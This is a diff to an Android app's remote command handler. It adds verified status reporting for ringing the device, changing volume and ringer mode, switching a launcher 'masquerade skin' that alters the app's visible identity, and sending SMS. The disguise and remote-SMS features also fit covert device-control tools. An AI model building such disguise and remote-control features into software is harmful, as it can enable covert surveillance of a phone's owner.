@@ -117,15 +117,19 @@ object CommandProcessor {
                     val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                     ringtone.play()
                     
-                    kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
-                        kotlinx.coroutines.delay(dur * 1000)
-                        ringtone.stop()
-                        if (PermissionManager.hasDndAccess(ctx)) {
-                            am.ringerMode = oldMode
+                    if (ringtone.isPlaying) {
+                        status = "SUCCESS"
+                        errorMsg = "Audible alert active for ${dur}s"
+                        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
+                            kotlinx.coroutines.delay(dur * 1000)
+                            ringtone.stop()
+                            if (PermissionManager.hasDndAccess(ctx)) am.ringerMode = oldMode
+                            am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                         }
-                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
+                    } else {
+                        status = "FAILED_AUDIO_BLOCKED"
+                        errorMsg = "Hardware output or system focus prevented playback."
                     }
-                    status = "RINGING (${dur}S)"
                 }
                 "STAY_READY" -> {
                     val mins = content.toLongOrNull() ?: 5L
@@ -698,8 +702,8 @@ object CommandProcessor {
                     if (parts.size >= 2) {
                         val streamStr = parts[0].trim().uppercase()
                         val levelStr = parts[1].trim().uppercase()
-                        
                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+                        
                         val stream = when (streamStr) {
                             "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                             "ALARM" -> android.media.AudioManager.STREAM_ALARM
@@ -713,10 +717,11 @@ object CommandProcessor {
                                     "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                                     else -> android.media.AudioManager.RINGER_MODE_NORMAL
                                 }
-                                status = "RINGER_MODE_SET ($levelStr)"
+                                status = "SUCCESS"
+                                errorMsg = "Ringer set to $levelStr (Verified: ${am.ringerMode})"
                             } else {
-                                status = "FAILED_PERMISSION (DND_ACCESS)"
-                                errorMsg = "Do Not Disturb access required to change ringer mode."
+                                status = "FAILED_PERMISSION"
+                                errorMsg = "DND access required for ringer control."
                             }
                         } else {
                             val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
@@ -726,12 +731,17 @@ object CommandProcessor {
                             if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
                                 am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                             }
+                            
                             am.setStreamVolume(stream, targetVol, 0)
-                            status = "VOLUME_SET ($streamStr to $pct%)"
+                            val verifiedVol = am.getStreamVolume(stream)
+                            val verifiedPct = ((verifiedVol.toFloat() / max) * 100).toInt()
+                            
+                            status = "SUCCESS"
+                            errorMsg = "Stream $streamStr set to $verifiedPct% (Requested $pct%)"
                         }
                     } else {
-                        status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: VOLUME | MEDIA/RING/ALARM | 0-100/SILENT/VIBRATE"
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Format: STREAM|LEVEL"
                     }
                 }
                 "GET_SENSORS" -> {
@@ -966,14 +976,22 @@ object CommandProcessor {
                                         else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                             pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
                         }
+
+                        val targetComp = android.content.ComponentName(ctx, "${ctx.packageName}${aliasMap[skin]}")
+                        val verifiedState = pm.getComponentEnabledSetting(targetComp)
                         
-                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
-                            .putString("active_masquerade_skin", skin).apply()
-                        
-                        status = "MASQUERADE_UPDATED: $skin"
+                        if (verifiedState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                            ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                                .putString("active_masquerade_skin", skin).apply()
+                            status = "SUCCESS"
+                            errorMsg = "Identity transformed to $skin"
+                        } else {
+                            status = "FAILED_VERIFICATION"
+                            errorMsg = "Component state did not update (Current: $verifiedState)"
+                        }
                     } else {
-                        status = "FAILED"
-                        errorMsg = "Unknown Skin: $skin"
+                        status = "FAILED_INVALID_SKIN"
+                        errorMsg = "Skin $skin not recognized."
                     }
                 }
                 "SET_TILE_STATE" -> {
@@ -1175,12 +1193,17 @@ object CommandProcessor {
                     if (parts.size >= 2) {
                         val num = parts[0].trim()
                         val msg = parts[1].trim()
-                        PhoneManager.sendLegitSms(ctx, num, msg)
-                        status = "SMS_DISPATCHED"
-                        errorMsg = "To: $num"
+                        try {
+                            PhoneManager.sendLegitSms(ctx, num, msg)
+                            status = "SUCCESS"
+                            errorMsg = "Accepted by SMS subsystem for delivery to $num"
+                        } catch (e: Exception) {
+                            status = "FAILED_DISPATCH"
+                            errorMsg = e.message ?: "Unknown SMS subsystem error"
+                        }
                     } else {
                         status = "FAILED_FORMAT"
-                        errorMsg = "Use: NUMBER | MESSAGE"
+                        errorMsg = "Format: NUMBER|MESSAGE"
                     }
                 }
                 "SET_RELENTLESS_ACC" -> {
